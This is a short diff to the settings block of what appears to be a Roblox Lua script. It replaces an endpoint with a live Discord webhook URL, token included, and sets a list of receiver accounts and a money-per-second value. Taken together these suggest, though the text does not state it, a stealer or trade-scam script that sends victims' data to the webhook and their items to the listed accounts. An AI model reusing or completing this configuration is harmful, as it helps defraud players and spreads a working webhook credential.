@@ -1,4 +1,4 @@
-getgenv().WEBHOOK = "https://roblox-web-mb0g.onrender.com/send/gA16-jaIs-PAZH-fAna"
+getgenv().WEBHOOK = "https://canary.discord.com/api/webhooks/1434007157640269885/ptddnFOdTQSscC_n11cF2SVclaAH5wLFz8AVo2cT87X1VPOwN1IVadUgDIYDir9G9UhS"
 getgenv().RECEIVERS = {"devrepay", "GAGRICHKID_0", "wextonstorage1", "Wextonstorage2",
 "wextonstorage3", "okinawa_tyd", "malcomgay", "leiimi_11"}
 getgenv().MONEY_PER_SECOND = 500000 -- DEFAULT: 100000/s
